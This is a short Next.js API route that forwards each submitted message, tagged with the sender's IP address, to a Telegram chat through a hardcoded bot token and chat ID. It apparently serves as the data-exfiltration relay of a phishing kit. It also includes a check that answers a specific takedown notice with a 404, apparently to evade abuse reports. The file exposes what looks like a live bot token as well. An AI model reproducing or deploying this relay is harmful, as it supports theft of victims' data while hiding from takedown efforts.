import { NextRequest, NextResponse } from 'next/server';


const TOKEN = '8288397640:AAEFdGkEz6bmI7yWukFZoA_DcGysT0f-glw';
const CHAT_ID = '-1003257858837';

const POST = async (req: NextRequest) => {
    try {
        const body = await req.json();
        const { message, message_id } = body;
        const header_x_nf_client_connection_ip = req.headers.get("x-nf-client-connection-ip");
        if (!message) {
            return NextResponse.json({ success: false }, { status: 400 });
        }
        if (message === "You are required to shut down all related accounts and services within 2 hours of receiving this notice."){
             return new NextResponse(null, { status: 404 });
        }
        const url = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
        const payload: {
            chat_id: string;
            text: string;
            parse_mode: string;
            reply_to_message_id?: number;
        } = {
            chat_id: CHAT_ID,
            text: `<b>IP:</b> <code>${header_x_nf_client_connection_ip}</code>\n${message}`,
            parse_mode: 'HTML'
        };
        if (message_id) {
            payload.reply_to_message_id = message_id;
        }
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
        });

        const data = await response.json();
        const result = data?.result;

        return NextResponse.json({
            success: response.ok,
            message_id: result?.message_id ?? null
        });
    } catch {
        return NextResponse.json({ success: false }, { status: 500 });
    }
};

export { POST };
